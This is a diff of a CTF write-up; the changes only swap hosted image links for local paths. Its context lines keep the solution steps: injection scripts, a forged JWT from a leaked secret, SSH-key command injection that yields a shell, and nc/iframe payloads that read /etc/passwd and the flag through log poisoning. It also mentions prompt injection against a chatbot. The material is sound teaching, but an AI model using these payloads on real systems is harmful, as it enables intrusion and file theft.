@@ -17,15 +17,15 @@ Solutions for all challenges I solved during and after the CTF.
 
 ## SNAD
 
-![image](https://hackmd.io/_uploads/BJTx-BWGxg.png)
+![image](./images/image0.png)
 
 This challenge gives us a website
 
-![image](https://hackmd.io/_uploads/BynaZSWMxg.png)
+![image](./images/image1.png)
 
 The source is too long so i will summarize it:
 
-![image](https://hackmd.io/_uploads/rJU_LBZfel.png)
+![image](./images/image2.png)
 
 * targetPositions: array of object contains x, y, colorHue
 * checkFlag(): to check if if all positions in targetPositions have true color and give the flag
@@ -39,31 +39,31 @@ for (a of targetPositions){ injectSand(a.x, a.y, a.colorHue) }
 
 Finally we got the flag
 
-![image](https://hackmd.io/_uploads/B1T6uS-zle.png)
+![image](./images/image3.png)
 
 Flag: flag{6ff0c72ad11bf174139e970559d9b5d2}
 
 ## No Sequel
 
-![image](https://hackmd.io/_uploads/SyI1OS-zeg.png)
+![image](./images/image4.png)
 
-![image](https://hackmd.io/_uploads/SJ_ztB-fll.png)
+![image](./images/image5.png)
 
 The website has a search page that allows users to perform regex-based searches.
 
-![image](https://hackmd.io/_uploads/HJ6QKr-zeg.png)
+![image](./images/image6.png)
 
 I tried a simple regex search and it gave me a result containing some content maybe the flag.
 
-![image](https://hackmd.io/_uploads/SJyDFHZzgl.png)
+![image](./images/image7.png)
 
 So what if i searched a sentence which have a letter 'a' at the beginning ?
 
-![image](https://hackmd.io/_uploads/Bk__YSZzlx.png)
+![image](./images/image8.png)
 
 No result! So I tried a letter 'f' and there was a result so maybe there is a 'flag{...}' 
 
-![image](https://hackmd.io/_uploads/HkDttrZGlx.png)
+![image](./images/image9.png)
 
 My solve script for blind sql injection: 
 
@@ -102,15 +102,15 @@ async def main():
 asyncio.run(main())
 ```
 
-![image](https://hackmd.io/_uploads/Hy0j2rZMge.png)
+![image](./images/image10.png)
 
 flag{4cb8649d9ecb0ec59d1784263602e686}
 
 ## Advanced Screening
 
-![image](https://hackmd.io/_uploads/SJ67AS-Mll.png)
+![image](./images/image11.png)
 
-![image](https://hackmd.io/_uploads/SJ1I0BWGel.png)
+![image](./images/image12.png)
 
 The source code: 
 
@@ -169,29 +169,29 @@ async function verifyCode() {
 
 It requires a 6 digits code to continue but I can't get it. I try to use the /api/screen-token to fuzz and yeah there is a user_id 7 gives me the hash token to access the /screen page
 
-![image](https://hackmd.io/_uploads/SysMk8-zll.png)
+![image](./images/image13.png)
 
-![image](https://hackmd.io/_uploads/SJDVJIbfxg.png)
+![image](./images/image14.png)
 
 Flag: flag{f0b1d2a98cd92d728ddd76067f959c31}
 
 ## TMCB
 
-![image](https://hackmd.io/_uploads/S1iFpU-zex.png)
+![image](./images/image15.png)
 
 The website has many checkboxes that we need to click all of them to get the flag
 
-![image](https://hackmd.io/_uploads/SJZhaUbfgx.png)
+![image](./images/image16.png)
 
 I notice how the data transfer and it uses websocket. But, it uses array of numbers?
 
-![image](https://hackmd.io/_uploads/BkappIZzll.png)
+![image](./images/image17.png)
 
 I try to fuzz a little bit and yeah we can use the array to append as many as checkboxes we want
 
-![image](https://hackmd.io/_uploads/HkZkAUbfxx.png)
+![image](./images/image18.png)
 
-![image](https://hackmd.io/_uploads/rkelRI-fxe.png)
+![image](./images/image19.png)
 
 My solve script: 
 
@@ -214,75 +214,75 @@ async def send_message():
 asyncio.run(send_message())
 ```
 
-![image](https://hackmd.io/_uploads/BkaTCL-zee.png)
+![image](./images/image20.png)
 
 Flag: flag{7d798903eb2a1823803a243dde6e9d5b}
 
 ## Infinite Queue
 
-![image](https://hackmd.io/_uploads/ry_ZJPZMee.png)
+![image](./images/image21.png)
 
-![image](https://hackmd.io/_uploads/SJq-EvbGge.png)
+![image](./images/image22.png)
 
 After I entered the email there was a JWT token in localStorage
 
-![image](https://hackmd.io/_uploads/rylXVv-Ggg.png)
+![image](./images/image23.png)
 
 try to modify the JWT and refresh it gives us an error which contains JWT key
 
-![image](https://hackmd.io/_uploads/H1eINv-Mgg.png)
+![image](./images/image24.png)
 
 "JWT_SECRET": "4A4Dmv4ciR477HsGXI19GgmYHp2so637XhMC". Now we can easily use this token to generate a new JWT which the queue_time we want.
 
-![image](https://hackmd.io/_uploads/B19qNvWMgg.png)
+![image](./images/image25.png)
 
-![image](https://hackmd.io/_uploads/SJI24w-zgl.png)
+![image](./images/image26.png)
 
 Flag: flag{b1bd4795215a7b81699487cc7e32d936}
 
 ## Method In The Madness
 
-![image](https://hackmd.io/_uploads/H1H1SDZMge.png)
+![image](./images/image27.png)
 
-![image](https://hackmd.io/_uploads/SymWrvZzex.png)
+![image](./images/image28.png)
 
-![image](https://hackmd.io/_uploads/B1RbrD-zlx.png)
+![image](./images/image29.png)
 
 i tried to click checkout and it checked my first checkbox
 
-![image](https://hackmd.io/_uploads/HJDGSPWfll.png)
+![image](./images/image30.png)
 
 Try to use another method and it gives another result
 
-![image](https://hackmd.io/_uploads/rylVSwWMxl.png)
+![image](./images/image31.png)
 
-![image](https://hackmd.io/_uploads/BJWSrvWfxx.png)
+![image](./images/image32.png)
 
 All the methods to solve this challenge: GET, POST, DELETE, PUT, OPTIONS, PATCH
 
-![image](https://hackmd.io/_uploads/SkShSD-fxe.png)
+![image](./images/image33.png)
 
 ## My first CTF
 
-![image](https://hackmd.io/_uploads/rJciIPbMle.png)
+![image](./images/image34.png)
 
-![image](https://hackmd.io/_uploads/Hy9gwDbMxx.png)
+![image](./images/image35.png)
 
 After using dirsearch on this website, I found /flag.txt endpoint
 
-![image](https://hackmd.io/_uploads/Hk1tvvWzex.png)
+![image](./images/image36.png)
 
 Try to access it but there is nothing 
 
-![image](https://hackmd.io/_uploads/HyqmPDWGxx.png)
+![image](./images/image37.png)
 
 Analyze the hint, it uses caesar cipher to encode the challenge title
 
-![image](https://hackmd.io/_uploads/HkVMPwWMee.png)
+![image](./images/image38.png)
 
 So i tried to encode flag.txt -> gmbh.uyu
 
-![image](https://hackmd.io/_uploads/SJ_8DwbMle.png)
+![image](./images/image39.png)
 
 Flag: flag{b67779a5cfca7f1dd120a075a633afe9}
 
@@ -334,7 +334,7 @@ async def main():
 asyncio.run(main())
 ```
 
-![image](https://hackmd.io/_uploads/SkeetwbGxx.png)
+![image](./images/image40.png)
 
 After finding the endpoint I try to change the code to fuzz the params
 
@@ -351,45 +351,45 @@ async def send(session, url, sem):
         except: pass
 ```
 
-![image](https://hackmd.io/_uploads/H1qAYv-zgl.png)
+![image](./images/image41.png)
 
 Flag: flag{9078bae810c524673a331aeb58fb0ebc}
 
 ## The Mission - Flag #1
 
-![image](https://hackmd.io/_uploads/S1DE5P-Gxe.png)
+![image](./images/image42.png)
 
 Check robots.txt
 
-![image](https://hackmd.io/_uploads/By4B9v-zle.png)
+![image](./images/image43.png)
 
 ## The Mission - Flag #4
 
 I notice it uses graphql api
 
-![image](https://hackmd.io/_uploads/BJ5YqPbflx.png)
+![image](./images/image44.png)
 
 try to inject some introspection and we have the users query
 
-![image](https://hackmd.io/_uploads/r1Hh9vbMxe.png)
+![image](./images/image45.png)
 
 Use it: ```"query":"\n {\n users{\n id \n username\n email\n }\n }\n"```
 
-![image](https://hackmd.io/_uploads/Bk6dsD-Mgl.png)
+![image](./images/image46.png)
 
 Flag: flag_4{253a82878df615bb9ee32e573dc69634}
 
 ## The Mission - Flag #6
 
-![image](https://hackmd.io/_uploads/H1kTivWGlx.png)
+![image](./images/image47.png)
 
 Try to fuzz the chatbot  using some prompt injection : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Prompt%20Injection/README.md
 
-![image](https://hackmd.io/_uploads/H13j3wZGel.png)
+![image](./images/image48.png)
 
 Adding some SSTI payload and yeah it has this bug
 
-![image](https://hackmd.io/_uploads/Bk1R3DWGxe.png)
+![image](./images/image49.png)
 
 Final payload
 
@@ -401,7 +401,7 @@ Flag: flag_6{9c2001f18f3b997187c9eb6d8c96ba60}
 
 ## Quartet
 
-![image](https://hackmd.io/_uploads/HJjIldWzll.png)
+![image](./images/image50.png)
 
 It gives us four parts of a zip file try to concat them and unzip to find the hidden data. My solve code:
 
@@ -424,15 +424,15 @@ with open("quartet.jpeg", "rb") as f:
     print(match.group(0).decode())
 ```
 
-![image](https://hackmd.io/_uploads/HkZ8z_Wzee.png)
+![image](./images/image51.png)
 
 Flag: flag{8f667b09d0e821f4e14d59a8037eb376}
 
 ## Flagdle
 
-![image](https://hackmd.io/_uploads/HJnDXO-Mxx.png)
+![image](./images/image52.png)
 
-![image](https://hackmd.io/_uploads/SyMcQubzgx.png)
+![image](./images/image53.png)
 
 My solve code:
 
@@ -458,29 +458,29 @@ for i in range(0, 32):
             break
 ```
 
-![image](https://hackmd.io/_uploads/S1ax4_Wfgx.png)
+![image](./images/image54.png)
 
 Flag: flag{bec42475a614b9c9ba80d0eb7ed258c5}
 
 ## The Martian
 
-![image](https://hackmd.io/_uploads/SJUEEOZMgx.png)
+![image](./images/image55.png)
 
 Try to extract data from the given file
 
-![image](https://hackmd.io/_uploads/HysLEuWfgx.png)
+![image](./images/image56.png)
 
 there is a jpeg image file so i try to view it 
 
-![image](https://hackmd.io/_uploads/HkKvV_-Geg.png)
+![image](./images/image57.png)
 
-![image](https://hackmd.io/_uploads/BkuuEubzee.png)
+![image](./images/image58.png)
 
 Flag: flag{0db031ac265b3e6538aff0d9f456004f}
 
 ## SSH Key Tester
 
-![image](https://hackmd.io/_uploads/HyHqVuWMxg.png)
+![image](./images/image59.png)
 
 Source code: 
 
@@ -548,7 +548,7 @@ if pubkey.startswith(b"command="):
 
 So it's something like executing a linux shell command when upload the public-key
 
-![image](https://hackmd.io/_uploads/ryB7S_bMge.png)
+![image](./images/image60.png)
 
 But how to bypass the filter? I try to add the space before it and it works
 
@@ -567,47 +567,47 @@ curl -X POST -F "id_rsa=@./exploit_key" -F "id_rsa.pub=@./exploit_key.pub" http:
 
 And we finally get the shell of this challenge system: 
 
-![image](https://hackmd.io/_uploads/BkXQIdbfgg.png)
+![image](./images/image61.png)
 
-![image](https://hackmd.io/_uploads/r11u8ubzex.png)
+![image](./images/image62.png)
 
 Flag: flag{786ad609004438adfb5d33aeaa507c66}
 
 ## I Want PIE
 
-![image](https://hackmd.io/_uploads/HkTKIO-Mlg.png)
+![image](./images/image63.png)
 
-![image](https://hackmd.io/_uploads/rkx3Uu-Mll.png)
+![image](./images/image64.png)
 
 Try to upload a file and it requires a ppm file
 
-![image](https://hackmd.io/_uploads/Hy0nUdWMee.png)
+![image](./images/image65.png)
 
 I try to research about it and yeah there is a thing like programming language over image called Piet
 
-![image](https://hackmd.io/_uploads/Hk4gv_-Mll.png)
+![image](./images/image66.png)
 
 Try to use this tool https://github.com/sebbeobe/piet_message_generator to generate an image that suits the problem statement
 
-![image](https://hackmd.io/_uploads/ByZswObMlx.png)
+![image](./images/image67.png)
 
 Reupload it: 
 
-![image](https://hackmd.io/_uploads/rk52w_WMgg.png)
+![image](./images/image68.png)
 
 Flag: flag{7deea6641b672696de44e60611a8a429}
 
 ## Sending Mixed Signals
 
-![image](https://hackmd.io/_uploads/HkCkdubzgg.png)
+![image](./images/image69.png)
 
 There are 3 questions about some commnunication app 
 
-![image](https://hackmd.io/_uploads/BJtf_uWzex.png)
+![image](./images/image70.png)
 
 My teammate @L1ttl3 found it in https://github.com/micahflee/TM-SGNL-Android. The first part is 
 
-![image](https://hackmd.io/_uploads/ryPEKdZzxe.png)
+![image](./images/image71.png)
 
 Part1: enRR8UVVywXYbFkqU#QDPRkO
 
@@ -617,11 +617,11 @@ Part2: moti@telemessage.com
 
 My teammate found the last part in the commit history
 
-![image](https://hackmd.io/_uploads/ryKUq_Wfle.png)
+![image](./images/image72.png)
 
 Part3: Release_5.4.11.20
 
-![image](https://hackmd.io/_uploads/SJz95u-fgl.png)
+![image](./images/image73.png)
 
 Flag: flag{96143e18131e48f4c937719992b742d7}
 
@@ -629,7 +629,7 @@ So these are all challengs I solved and next is some web challenges I solve afte
 
 ## My Third CTF
 
-![image](https://hackmd.io/_uploads/S1rsidWzeg.png)
+![image](./images/image74.png)
 
 Fuzzing like my second one but it's like /rot1/rot2/rot3/rot4. My solve code: 
 
@@ -685,19 +685,19 @@ async def main():
 asyncio.run(main())
 ```
 
-![image](https://hackmd.io/_uploads/B1AG-tWfle.png)
+![image](./images/image75.png)
 
 Flag: flag{afd87cae63c08a57db7770b4e52081d3}
 
 ## Outcast
 
-![image](https://hackmd.io/_uploads/rywNZtWGex.png)
+![image](./images/image76.png)
 
-![image](https://hackmd.io/_uploads/B1aLWtbzxl.png)
+![image](./images/image77.png)
 
 After using dirsearch to find something sus, I have a test page like this
 
-![image](https://hackmd.io/_uploads/B14ObYWzex.png)
+![image](./images/image78.png)
 
 And the source code of an APICaller
 
@@ -758,43 +758,43 @@ I found two bugs file inclusion and client side path traversal
 
 `file=@/tmp/../../../../flag.txt&file2=@/tmp/1`
 
-![image](https://hackmd.io/_uploads/S1_2WtbMex.png)
+![image](./images/image79.png)
 
-![image](https://hackmd.io/_uploads/BksQGYWGxg.png)
+![image](./images/image80.png)
 
 So I try to use username as the params to /login/ page so that the username value will be display in the source code. (missing only this step 😢)
 
-![image](https://hackmd.io/_uploads/rkLIGY-Mge.png)
+![image](./images/image81.png)
 
 Flag: FLAG{ch41ning_bug$_1s_W0nd3rful!}
 
 ## Access all areas
 
-![image](https://hackmd.io/_uploads/B1Y_YFWfll.png)
+![image](./images/image82.png)
 
 The challenge gives me a website
 
-![image](https://hackmd.io/_uploads/BJ19YK-zeg.png)
+![image](./images/image83.png)
 
 The log of this website
 
-![image](https://hackmd.io/_uploads/B1wV5t-fxl.png)
+![image](./images/image84.png)
 
 Try path traversal fuzzing but it requires .log file
 
-![image](https://hackmd.io/_uploads/SksLqKWfgl.png)
+![image](./images/image85.png)
 
 I find a file called /var/log/nginx/access.log to save the access history and this is the only page where we can insert arbitrary content via params
 
 
 
-![image](https://hackmd.io/_uploads/BJF25FbGxx.png)
+![image](./images/image86.png)
 
 So what we can exploit? After read this article, I think there is a ssrf bug : https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-pdf-generators-a-complete-guide-to-finding-ssrf-vulnerabilities-in-pdf-generators
 
 Try to add some iframe tag but the url is url-encoded `http://challenge.nahamcon.com:32725/api/log.php?log=../../../../var/log/nginx/access.log&hehe=<iframe src='file:///etc/passwd'/>`
 
-![image](https://hackmd.io/_uploads/B16ViKWfxl.png)
+![image](./images/image87.png)
 
 Try to use tcp to send data so that it won't be url-encoded
 
@@ -804,7 +804,7 @@ printf "GET /api/log.php?log=../../../../var/log/nginx/access.log&hehe=<iframe s
 
 and yeah we finally have the file inclusion bug
 
-![image](https://hackmd.io/_uploads/SkRsjKWMlg.png)
+![image](./images/image88.png)
 
 Now we try to get the flag maybe it's in flag.txt or /flag.txt
 
@@ -812,7 +812,7 @@ Now we try to get the flag maybe it's in flag.txt or /flag.txt
 printf "GET /api/log.php?log=../../../../var/log/nginx/access.log&hehe=<iframe src='file:///flag.txt'></iframe> HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n" | nc challenge.nahamcon.com 32725
 ```
 
-![image](https://hackmd.io/_uploads/SyQ72tWfeg.png)
+![image](./images/image89.png)
 ## Talk Tuah 
 
 Updating...
